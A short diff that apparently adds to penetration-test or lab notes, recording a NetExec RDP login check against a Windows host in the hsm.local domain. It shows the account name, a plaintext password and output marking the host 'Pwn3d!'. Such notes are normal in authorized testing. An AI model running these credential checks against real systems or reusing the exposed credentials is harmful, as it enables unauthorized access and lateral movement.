@@ -340,3 +340,10 @@ SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  Share           READ,WRITE
 ```
 This user has a lot of access on SMB here
 
+## RDP access on the windows workstation as `ghill_sa`
+```python
+nxc rdp EC2AMAZ-NS87CNK.hsm.local -u 'ghill_sa' -p 'P@ssw0rd!' --local-auth       
+RDP         10.0.28.154     3389   EC2AMAZ-NS87CNK  [*] Windows 10 or Windows Server 2016 Build 26100 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (nla:True)
+RDP         10.0.28.154     3389   EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\ghill_sa:P@ssw0rd! (Pwn3d!)
+```
+This user also has access over RDP
